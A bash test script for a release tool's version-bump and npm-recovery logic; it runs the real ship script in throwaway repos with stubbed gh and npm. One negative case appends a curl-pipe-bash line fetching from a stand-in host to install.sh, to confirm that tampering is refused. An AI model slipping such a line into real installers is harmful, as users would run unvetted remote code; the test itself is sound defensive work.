#!/usr/bin/env bash
#
# ship-npm-only-after-bump.test.sh — a full ship's own version-bump commit must not stale the sweep
# receipt that authorised the ship, for the recovery modes that run AFTER the release is tagged.
#
#   bash test/ship-npm-only-after-bump.test.sh    (exit 0 = all cases pass)
#
# THE DEFECT. release/ship.sh grades the green FULL sweep receipt BEFORE it bumps (so it grades the
# commit it was asked to ship), then commits `chore(release): vX.Y.Z` — one commit no sweep ever saw —
# and tags it. A later `release/ship.sh --npm-only` (the recovery for a publish that failed, or for a ship
# run with --no-npm) graded the receipt again at HEAD and refused: "receipt graded <the commit before the
# bump> but HEAD is <the bump commit>", with nothing having landed since the ship. The ship had
# invalidated its own authority.
#
# THE FIX under test. In the post-tag modes (--npm-only, --release-only) the receipt also covers HEAD when
# the only thing past the graded commit is the TAGGED `chore(release): vX.Y.Z` commit and that commit does
# nothing but re-pin version files:
#   - every changed path is one the bump writes (RELEASE_BUMP_PATHS) or CHANGELOG.md;
#   - only in-place edits with the file mode untouched;
#   - each file differs from its parent in nothing but version numbers and sha256 digests;
#   - CHANGELOG.md differs only in the release heading;
#   - exactly one parent, the subject is exactly `chore(release): v<version>`, the manifest version really
#     moved, and the tag v<version at HEAD> names it.
# Journal/ledger commits (bin/lib/hook-owned-path.sh) never stale a receipt, before or after the bump.
# Anything else fails CLOSED: the STALE refusal stands and now says why the exemption did not apply.
#
# HOW IT IS PROVEN. A throwaway plugin repo carries the REAL release/ship.sh, release/sync-release.sh,
# bin/heimdall-render-version, bin/heimdall-check-identities and bin/lib/hook-owned-path.sh. The REAL full
# ship runs in it (guards, bump, render, sync, commit, push to a local bare origin, fresh-clone R9, tag,
# Release), then the REAL `--npm-only` runs. The only fakes are the three external CLIs first on PATH —
# gh, gitleaks, npm — so no Release is created and nothing can reach a registry: the npm stub's `publish`
# only drops a marker file, and this test refuses to run unless that stub is what `npm` resolves to.
# `--dry-run` cannot serve as the no-publish seam: it exits BEFORE the receipt check, so a dry run passes
# for any receipt and would prove nothing here.
#
# R6 (checks must be able to fail): the refusals below are the corrupt-and-confirm proofs. If the exemption
# were over-broad (path-only, tag-optional, any trailing commit) one of them would flip to "accepted"; if it
# were dropped, the accepted cases would flip to "refused".
set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
SHIP="$REPO/release/ship.sh"

PASS=0; FAIL=0
ok()  { printf '  \033[32mPASS\033[0m %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
tail_of() { tail -n "${2:-15}" "$1" 2>/dev/null | sed 's/^/      | /' >&2; }

if ! command -v jq >/dev/null 2>&1 || ! command -v git >/dev/null 2>&1; then
  echo "FATAL: jq and git are required" >&2; exit 2
fi

WORK="$(mktemp -d "${TMPDIR:-/tmp}/ship-npm-only-bump-test.XXXXXX")"
[ -n "$WORK" ] && [ -d "$WORK" ] || { echo "FATAL: mktemp failed" >&2; exit 2; }
# shellcheck disable=SC2329 # invoked indirectly: the EXIT trap on the next line
cleanup() { rm -rf "$WORK" 2>/dev/null || true; }
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

# Nothing in the developer's git/npm configuration may leak into the throwaway repos, and nothing may
# be able to sign, hook or publish.
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_PREFIX \
      GIT_AUTHOR_NAME GIT_AUTHOR_EMAIL GIT_COMMITTER_NAME GIT_COMMITTER_EMAIL
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
export NPM_CONFIG_USERCONFIG="$WORK/no-npmrc" NPM_CONFIG_GLOBALCONFIG="$WORK/no-npmrc-global"

# ── The three external CLIs, first on PATH ────────────────────────────────────
STUB="$WORK/stubbin"; mkdir -p "$STUB"
NOOP="$WORK/noop"; printf '#!/usr/bin/env bash\nexit 0\n' > "$NOOP"; chmod +x "$NOOP"
cp "$NOOP" "$STUB/gitleaks"

# gh: records what ship.sh asks GitHub to do and talks to no network.
#   $GH_STUB_STATE/created = "the Release exists";  $GH_STUB_STATE/assets = uploaded asset names, one per line.
cat > "$STUB/gh" <<'GH'
#!/usr/bin/env bash
state="${GH_STUB_STATE:?GH_STUB_STATE unset}"
mkdir -p "$state"
case "${1:-} ${2:-}" in
  "auth status") exit 0 ;;
  "release view")
    [ -f "$state/created" ] || exit 1
    case " $* " in *" --json "*) cat "$state/assets" 2>/dev/null ;; esac
    exit 0 ;;
  "release create") : > "$state/created"; echo "https://github.com/stub/stub/releases/tag/${3:-}"; exit 0 ;;
  "release upload") basename "${4:-}" >> "$state/assets"; exit 0 ;;
  *) exit 0 ;;
esac
GH

# npm: the registry boundary. NOTHING here can publish — `publish` only drops
#   $NPM_STUB_STATE/published-<name>-<version>, which `npm view <name>@<version>` then reports as live.
cat > "$STUB/npm" <<'NPM'
#!/usr/bin/env bash
state="${NPM_STUB_STATE:?NPM_STUB_STATE unset}"
mkdir -p "$state"
args=(); for a in "$@"; do case "$a" in --*) ;; *) args+=("$a") ;; esac; done
case "${args[0]:-}" in
  whoami) echo "tester"; exit 0 ;;
  view)
    spec="${args[1]:-}"
    case "$spec" in
      *@*) ver="${spec##*@}"; name="${spec%@*}"
           [ -f "$state/published-$name-$ver" ] && { echo "$ver"; exit 0; }
           echo "npm ERR! code E404 (stub: $spec is not in the registry)" >&2; exit 1 ;;
      *)   echo "0.0.1"; exit 0 ;;
    esac ;;
  owner) echo "tester <tester@example.com>"; exit 0 ;;
  publish)
    ver="$(jq -r .version ./package.json)"; name="$(jq -r .name ./package.json)"
    : > "$state/published-$name-$ver"; echo "+ $name@$ver"; exit 0 ;;
  *) exit 0 ;;
esac
NPM
chmod +x "$STUB/gh" "$STUB/npm"

NPM_RESOLVES_TO="$(PATH="$STUB:$PATH" command -v npm)"
if [ "$NPM_RESOLVES_TO" != "$STUB/npm" ]; then
  echo "FATAL: npm does not resolve to the stub — refusing to run anything that could reach a registry" >&2
  exit 2
fi

# ── The throwaway plugin repo ─────────────────────────────────────────────────
RAW="https://raw.githubusercontent.com/randomittin/heimdall"
GH_REL="https://github.com/randomittin/heimdall/releases/download"
OLD_VER="9.9.9"; NEW_VER="9.9.10"; NEW_TAG="v$NEW_VER"
ZERO_SHA="$(printf '%064d' 0)"
# The README's generated-region markers are read from the REAL renderer, never retyped.
MARK_BEGIN="$(sed -n "s/^MARK_BEGIN='\(.*\)'\$/\1/p" "$REPO/bin/heimdall-render-version")"
MARK_END="$(sed -n "s/^MARK_END='\(.*\)'\$/\1/p" "$REPO/bin/heimdall-render-version")"
[ -n "$MARK_BEGIN" ] && [ -n "$MARK_END" ] \
  || { echo "FATAL: could not read the HEIMDALL:VERSION markers out of bin/heimdall-render-version" >&2; exit 2; }

fx_readme() {  # $1=version — the README in its steady state at that version
  # shellcheck disable=SC2016 # literal README text: the backticks around the tag are file content, not command substitutions
  printf '# Fixture plugin\n\n%s\n[![Version](https://img.shields.io/badge/version-%s-00d4ff?style=flat-square)](CHANGELOG.md)\n%s\n\nInstall: curl -fsSL %s/v%s/install.sh | bash <!-- HEIMDALL:PIN:TAG -->\nPinned to the `v%s` tag.\nSignature: %s/v%s/install.sh.minisig\n' \
    "$MARK_BEGIN" "$1" "$MARK_END" "$RAW" "$1" "$1" "$GH_REL" "$1"
}

write_receipt() {  # $1=repo  $2=graded sha  $3=HEIMDALL_HOME — a receipt shaped like the one test/run-all.sh writes
  mkdir -p "$3/receipts" || return 1
  jq -n --arg repo "$(git -C "$1" rev-parse --show-toplevel)" --arg head "$2" \
    '{finished_at:"2026-10-13T00:00:00Z", repo:$repo, head_sha:$head, tree_clean:true, exit_code:0, kind:"full", suites_total:1, suites_passed:1, suites_failed:0}' \
    > "$3/receipts/last-full-green.json"
}

# make_fixture <dir> <journal-before-ship 0|1> — a plugin repo at the steady state of version 9.9.9, ready to ship.
# History: initial -> a real code change (the commit the receipt grades) [-> a journal commit]. Sets FX_C0, FX_RECEIPT_SHA.
make_fixture() {
  local d="$1" jb="${2:-0}" p
  mkdir -p "$d/release" "$d/bin/lib" "$d/.claude-plugin" "$d/packages/runheimdall" "$d/packages/runhmd" || return 1
  cp "$SHIP" "$d/release/ship.sh" \
    && cp "$REPO/release/sync-release.sh" "$d/release/sync-release.sh" \
    && cp "$REPO/bin/heimdall-render-version" "$d/bin/heimdall-render-version" \
    && cp "$REPO/bin/heimdall-check-identities" "$d/bin/heimdall-check-identities" \
    && cp "$REPO/bin/lib/hook-owned-path.sh" "$d/bin/lib/hook-owned-path.sh" || return 1
  printf '#!/usr/bin/env bash\necho "- a real changelog line"\n' > "$d/bin/generate-changelog"
  chmod +x "$d/release/ship.sh" "$d/release/sync-release.sh" "$d/bin/heimdall-render-version" \
           "$d/bin/heimdall-check-identities" "$d/bin/generate-changelog" || return 1
  # Every rendered file is written the way the real writers leave it (jq-formatted JSON, 302 redirects,
  # permanent:false) so the bump changes ONLY version pins — the steady state of the real repo.
  jq -n --arg v "$OLD_VER" '{name:"heimdall", version:$v}' > "$d/.claude-plugin/plugin.json"
  printf '%s\n' "$OLD_VER" > "$d/VERSION"
  fx_readme "$OLD_VER" > "$d/README.md"
  cp "$d/README.md" "$d/packages/runheimdall/README.md"
  # shellcheck disable=SC2016 # literal installer text: "$DEFAULT_REF" is file content for the fixture's install.sh, not an expansion here
  printf '#!/usr/bin/env bash\ninstall() {\n  local DEFAULT_REF="v%s"\n  echo "$DEFAULT_REF"\n}\n' "$OLD_VER" > "$d/install.sh"
  jq -n --arg url "$RAW/v$OLD_VER/install.sh" '{redirects:[{source:"/install", destination:$url, permanent:false}]}' > "$d/vercel.json"
  printf '/install  %s/v%s/install.sh  302\n' "$RAW" "$OLD_VER" > "$d/_redirects"
  for p in runheimdall runhmd; do
    jq -n --arg name "$p" --arg v "$OLD_VER" --arg tag "v$OLD_VER" --arg url "$RAW/v$OLD_VER/install.sh" --arg sha "$ZERO_SHA" \
      '{name:$name, version:$v, description:"Nothing ships unproven.", files:["README.md"], heimdall:{tag:$tag, installScriptUrl:$url, sha256:$sha}}' \
      > "$d/packages/$p/package.json"
  done
  printf '# Changelog\n\n## [Unreleased]\n\n### Changed\n- a fixture entry\n\n## [%s] - 2026-01-01\n\n- first\n' "$OLD_VER" > "$d/CHANGELOG.md"
  printf '.heimdall/\n' > "$d/.gitignore"
  git init -q "$d" \
    && git -C "$d" config user.email "rj@runheimdall.dev" && git -C "$d" config user.name "RJ" \
    && git -C "$d" config commit.gpgsign false || return 1
  git -C "$d" add -A && git -C "$d" commit -q -m "chore: initial fixture" && git -C "$d" branch -M main || return 1
  FX_C0="$(git -C "$d" rev-parse HEAD)"
  # The previous release is tagged, as in the real repo: release notes are ranged from it.
  git -C "$d" tag "v$OLD_VER" "$FX_C0" || return 1
  printf '#!/usr/bin/env bash\necho feature\n' > "$d/bin/feature.sh"
  git -C "$d" add -A && git -C "$d" commit -q -m "feat: a real change" || return 1
  FX_RECEIPT_SHA="$(git -C "$d" rev-parse HEAD)"
  write_receipt "$d" "$FX_RECEIPT_SHA" "$d.home" || return 1
  if [ "$jb" = "1" ]; then   # a hook-owned commit between the graded commit and the ship
    mkdir -p "$d/.planning/journal" || return 1
    printf 'a journal entry\n' > "$d/.planning/journal/2026-10-13-haid_fixture.md"
    git -C "$d" add -A && git -C "$d" commit -q -m "journal: [COMMUNICATION] fixture entry" || return 1
  fi
  # The bare origin's HEAD must name main, or R9's fresh clone has nothing to check out.
  git init -q --bare "$d.git" && git -C "$d.git" symbolic-ref HEAD refs/heads/main \
    && git -C "$d" remote add origin "$d.git" && git -C "$d" push -q -u origin main \
    && git -C "$d" push -q origin "refs/tags/v$OLD_VER" || return 1
}

# run_ship <repo> <ship.sh args...> — output lands in "<repo>.out". The three paths a run could use to reach
# outside the sandbox (the marketing-site checkout sync-release pushes to, the minisign key, the landmine
# linter) are pinned inside it.
run_ship() {
  local d="$1"; shift
  rm -rf "$d.gh" "$d.npm"
  ( cd "$d" || exit 99
    PATH="$STUB:$PATH" HEIMDALL_HOME="$d.home" HEIMDALL_SITE_DIR="$WORK/no-site" \
    HEIMDALL_SIGNING_KEY="$WORK/no-signing.key" SHIP_LANDMINE_LINT="$NOOP" \
    GH_STUB_STATE="$d.gh" NPM_STUB_STATE="$d.npm" bash release/ship.sh "$@" ) >"$d.out" 2>&1
}

published_count() { local n=0 f; for f in "$1".npm/published-*; do [ -e "$f" ] && n=$((n+1)); done; echo "$n"; }

# variant <name> — sets V to a private copy of the released BASE fixture, its receipt re-pointed at the copy's own path.
# Its origin points nowhere: `git fetch origin` would otherwise re-fetch a tag a case deliberately deleted.
variant() {
  V="$WORK/v-$1"
  if ! { cp -R "$BASE" "$V" && cp -R "$BASE.home" "$V.home" \
         && git -C "$V" remote set-url origin "$V.nowhere.git" \
         && write_receipt "$V" "$BASE_RECEIPT_SHA" "$V.home"; }; then
    echo "FATAL: could not copy the base fixture to $V" >&2; exit 2
  fi
}

commit_all() {
  if ! { git -C "$1" add -A && git -C "$1" commit -q -m "$2"; }; then echo "FATAL: commit failed in $1" >&2; exit 2; fi
}

# commit_paths <repo> <message> <path...> — commit exactly those paths, as the journal hook does.
commit_paths() {
  local d="$1" msg="$2"; shift 2
  if ! { git -C "$d" add -- "$@" && git -C "$d" commit -q -m "$msg"; }; then echo "FATAL: commit failed in $d" >&2; exit 2; fi
}

# amend_bump <repo> <git commit --amend args...> — rewrite the release commit (changes already in the index)
# and re-point the release tag at the amended commit.
amend_bump() {
  local d="$1"; shift
  if ! { git -C "$d" commit -q --amend "$@" >/dev/null 2>&1 && git -C "$d" tag -f "$NEW_TAG" >/dev/null 2>&1; }; then
    echo "FATAL: could not amend the bump commit in $d" >&2; exit 2
  fi
}

expect_accepted() {  # <label> <repo> <ship flag> <success banner> <receipt line the run must print>
  local label="$1" d="$2" flag="$3" banner="$4" line="$5" rc
  run_ship "$d" "$flag"; rc=$?
  if [ "$rc" -eq 0 ] && grep -Fq -- "$line" "$d.out" && grep -Fq -- "$banner" "$d.out"; then
    ok "$label: $flag accepts the receipt and runs to its end (rc=0)"
  else
    bad "$label: $flag should accept the receipt (rc=$rc; wanted '$line' and '$banner')"; tail_of "$d.out" 18
  fi
  if [ "$flag" = "--npm-only" ]; then
    if [ "$(published_count "$d")" -eq 2 ]; then
      ok "$label: both wrappers reached the stubbed registry boundary"
    else
      bad "$label: expected 2 publishes at the npm stub, saw $(published_count "$d")"
    fi
  fi
}

expect_refused() {  # <label> <repo> <ship flag> <reason the refusal must start with after "exemption does not apply: ">
  local label="$1" d="$2" flag="$3" reason="$4" rc
  run_ship "$d" "$flag"; rc=$?
  if [ "$rc" -ne 0 ] && grep -Fq 'receipt is STALE' "$d.out"; then
    ok "$label: $flag REFUSES on the stale receipt (rc=$rc)"
  else
    bad "$label: $flag should refuse on the stale receipt (rc=$rc)"; tail_of "$d.out" 12
  fi
  if grep -Fq -- "exemption does not apply: $reason" "$d.out"; then
    ok "$label: the refusal says why — '$reason'"
  else
    bad "$label: the refusal does not give the reason '$reason'"; tail_of "$d.out" 6
  fi
  if [ "$flag" != "--npm-only" ] || [ "$(published_count "$d")" -eq 0 ]; then
    ok "$label: a refused run published nothing"
  else
    bad "$label: a refused run still reached npm publish ($(published_count "$d") times)"
  fi
}

echo "ship-npm-only-after-bump harness  ship=$SHIP"
echo "--------------------------------------------------------------------"

# ── [1] The REAL full ship, in a throwaway repo ───────────────────────────────
echo "[1] the real full ship"
BASE="$WORK/base"
make_fixture "$BASE" 0 || { echo "FATAL: could not build the fixture repo" >&2; exit 2; }
BASE_C0="$FX_C0"; BASE_RECEIPT_SHA="$FX_RECEIPT_SHA"
run_ship "$BASE" --no-npm; rc=$?
if [ "$rc" -eq 0 ] && grep -Fq 'Shipped & verified' "$BASE.out" && grep -Fq "Released $NEW_TAG" "$BASE.out"; then
  ok "full ship: exits 0 — guards, bump, push, fresh-clone R9, tag and Release all ran"
else
  bad "full ship: did not complete (rc=$rc) — the harness cannot stand in for a real ship"; tail_of "$BASE.out" 25
  echo ""; echo "ship-npm-only-after-bump.test.sh: $PASS passed, $FAIL failed."; exit 1
fi
BUMP="$(git -C "$BASE" rev-parse HEAD)"
if [ "$(git -C "$BASE" log -1 --format=%s)" = "chore(release): $NEW_TAG" ] \
   && [ "$(git -C "$BASE" rev-parse "refs/tags/$NEW_TAG^{commit}")" = "$BUMP" ] \
   && [ "$(git -C "$BASE" rev-parse HEAD^)" = "$BASE_RECEIPT_SHA" ]; then
  ok "full ship: HEAD is the tagged chore(release) commit, directly on the commit the receipt graded"
else
  bad "full ship: HEAD is not the tagged chore(release) commit on the graded commit"; git -C "$BASE" log --oneline -4 >&2
fi
if [ -z "$(git -C "$BASE" status --porcelain)" ]; then
  ok "full ship: leaves the working tree clean — everything the bump rewrote is in the release commit"
else
  bad "full ship: left uncommitted changes behind (the fixture would not model a real ship)"; git -C "$BASE" status --short >&2
fi
# The exemption's path allowlist must be EXACTLY what the real bump writes: too narrow and every real ship
# is refused, too wide and unproven files ride in. The bump here is the real one, so this pins the two together.
# shellcheck disable=SC1090 # $SHIP is the file under test; the SHIP_SOURCE_ONLY seam defines its functions and runs nothing
ALLOW="$( cd "$REPO" && SHIP_SOURCE_ONLY=1 . "$SHIP" >/dev/null 2>&1 && printf '%s\n' "${RELEASE_BUMP_PATHS:-}" )"
CHANGED="$(git -C "$BASE" diff --name-only --no-renames HEAD^ HEAD | sort)"
if [ -n "$ALLOW" ] && [ "$CHANGED" = "$(printf '%s\n' "$ALLOW" | sort)" ]; then
  ok "full ship: the files the real bump changed are exactly ship.sh's RELEASE_BUMP_PATHS"
else
  bad "full ship: the real bump's changed files differ from RELEASE_BUMP_PATHS"
  printf '      changed by the bump:\n%s\n      RELEASE_BUMP_PATHS:\n%s\n' "$(printf '%s\n' "$CHANGED" | sed 's/^/        /')" "$(printf '%s\n' "$ALLOW" | sort | sed 's/^/        /')" >&2
fi

# ── [2] The operator's scenario: --npm-only right after the full ship, nothing landed in between ──
echo "[2] --npm-only after a full ship"
expect_accepted "nothing landed" "$BASE" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers HEAD"
if grep -Fq "through the tagged release commit $NEW_TAG (${BUMP:0:12})" "$BASE.out"; then
  ok "nothing landed: the accepted run names the release commit it went through ($NEW_TAG, ${BUMP:0:12})"
else
  bad "nothing landed: the accepted run does not name the release commit $NEW_TAG (${BUMP:0:12})"; tail_of "$BASE.out" 8
fi

# ── [3] Other shapes that must still be accepted ──────────────────────────────
echo "[3] accepted shapes"
variant release-only
expect_accepted "tagged bump" "$V" --release-only "Released $NEW_TAG" "green FULL sweep receipt covers HEAD"

variant journal-after
mkdir -p "$V/.planning/journal" && printf 'entry\n' > "$V/.planning/journal/2026-10-13-haid_after.md"
commit_paths "$V" "journal: [COMMUNICATION] after the release" .planning/journal/2026-10-13-haid_after.md
expect_accepted "journal-only commit after the bump" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers HEAD"

variant changelog-heading
sed "s/^## \[Unreleased\]\$/## [$NEW_VER] - 2026-10-13/" "$V/CHANGELOG.md" > "$V/CHANGELOG.md.new" && mv "$V/CHANGELOG.md.new" "$V/CHANGELOG.md"
git -C "$V" add CHANGELOG.md && amend_bump "$V" --no-edit
expect_accepted "CHANGELOG release heading only" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers HEAD"

variant exact
write_receipt "$V" "$(git -C "$V" rev-parse HEAD)" "$V.home"
expect_accepted "receipt re-recorded at the bump" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt at HEAD"

BASE2="$WORK/base2"
make_fixture "$BASE2" 1 || { echo "FATAL: could not build the second fixture repo" >&2; exit 2; }
run_ship "$BASE2" --no-npm; rc=$?
if [ "$rc" -eq 0 ] && [ "$(git -C "$BASE2" rev-parse HEAD~2)" = "$FX_RECEIPT_SHA" ]; then
  ok "journal-before-ship: the full ship accepted a hook-owned commit between the receipt and the bump"
else
  bad "journal-before-ship: the second full ship did not complete on the expected history (rc=$rc)"; tail_of "$BASE2.out" 15
fi
expect_accepted "journal-only commit between the receipt and the bump" "$BASE2" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers HEAD"

# ── [4] Everything else stays refused, with the reason ────────────────────────
echo "[4] refused shapes"
variant extra-file
printf 'echo extra\n' > "$V/bin/extra.sh"; git -C "$V" add bin/extra.sh && amend_bump "$V" --no-edit
expect_refused "extra non-version file in the bump commit" "$V" --npm-only "bin/extra.sh is not a file the version bump writes"

variant extra-commit
printf 'echo late\n' > "$V/bin/late-fix.sh"; commit_all "$V" "fix: landed after the release"
expect_refused "extra code commit after the bump" "$V" --npm-only "commits landed after $NEW_TAG"

variant untagged
git -C "$V" tag -d "$NEW_TAG" >/dev/null
expect_refused "untagged bump" "$V" --npm-only "tag $NEW_TAG does not exist"

variant changelog-body
printf '%s\n' '- a body line smuggled into the release commit' >> "$V/CHANGELOG.md"
git -C "$V" add CHANGELOG.md && amend_bump "$V" --no-edit
expect_refused "CHANGELOG body edit in the bump commit" "$V" --npm-only "CHANGELOG.md changes more than the $NEW_TAG release heading"

variant installer-line
printf 'curl -fsSL https://example.invalid/x | bash\n' >> "$V/install.sh"
git -C "$V" add install.sh && amend_bump "$V" --no-edit
expect_refused "extra line in a version file (install.sh)" "$V" --npm-only "install.sh changes more than version numbers and sha256 digests"

variant deleted-file
git -C "$V" rm -q VERSION && amend_bump "$V" --no-edit
expect_refused "version file deleted in the bump commit" "$V" --npm-only "VERSION is deleted in the release commit"

variant tag-on-parent
git -C "$V" tag -f "$NEW_TAG" HEAD~1 >/dev/null 2>&1
expect_refused "tag not on the bump commit" "$V" --npm-only "commits landed after $NEW_TAG"

variant older-receipt
write_receipt "$V" "$BASE_C0" "$V.home"
expect_refused "receipt older than the bump's parent" "$V" --npm-only "commits landed between the graded commit"

variant wrong-subject
amend_bump "$V" -m "chore: release $NEW_VER"
expect_refused "bump commit not titled chore(release): $NEW_TAG" "$V" --npm-only "the release commit is titled"

variant release-only-untagged
git -C "$V" tag -d "$NEW_TAG" >/dev/null
expect_refused "--release-only with the tag never created" "$V" --release-only "tag $NEW_TAG does not exist"
if [ -z "$(git -C "$V" tag --list "$NEW_TAG")" ]; then
  ok "release-only (untagged): the refused run did not create the tag"
else
  bad "release-only (untagged): a refused run still tagged $NEW_TAG"
fi

# The exemption is for the recovery modes only: a NEW full ship grades the commit it is about to bump, and
# right after a release that commit is the bump itself, which no sweep has seen.
variant second-ship
BEFORE="$(git -C "$V" rev-parse HEAD)"
run_ship "$V" --no-npm; rc=$?
if [ "$rc" -ne 0 ] && grep -Fq 'receipt is STALE' "$V.out" && ! grep -Fq 'exemption' "$V.out" \
   && [ "$(git -C "$V" rev-parse HEAD)" = "$BEFORE" ]; then
  ok "a second full ship is still refused on the pre-bump receipt: the exemption is post-tag only, nothing was bumped"
else
  bad "a second full ship was not refused strictly (rc=$rc)"; tail_of "$V.out" 12
fi

# ── [5] Reality check: the newest REAL bump commit of this repo obeys the same shape rule ──
echo "[5] the real release history"
REAL_BUMP="$(git -C "$REPO" log -1 --format=%H --grep='^chore(release): v[0-9]' 2>/dev/null)"
if [ "$(git -C "$REPO" rev-parse --is-shallow-repository 2>/dev/null)" = "true" ] || [ -z "$REAL_BUMP" ]; then
  echo "  SKIP no complete release history in this checkout (shallow clone, or no chore(release) commit)"
else
  # shellcheck disable=SC1090 # $SHIP is the file under test; the SHIP_SOURCE_ONLY seam defines its functions and runs nothing
  WHY="$( cd "$REPO" && SHIP_SOURCE_ONLY=1 . "$SHIP" && release_commit_pins_only "$REAL_BUMP" )"; rc=$?
  if [ "$rc" -eq 0 ]; then
    ok "the newest real bump commit (${REAL_BUMP:0:12}) satisfies the shape rule — the allowlist matches reality"
  else
    bad "the newest real bump commit (${REAL_BUMP:0:12}) fails the shape rule: ${WHY:-<no reason>} — extend RELEASE_BUMP_PATHS together with the bump"
  fi
fi

echo ""
echo "ship-npm-only-after-bump.test.sh: $PASS passed, $FAIL failed."
[ "$FAIL" -eq 0 ] || exit 1
exit 0
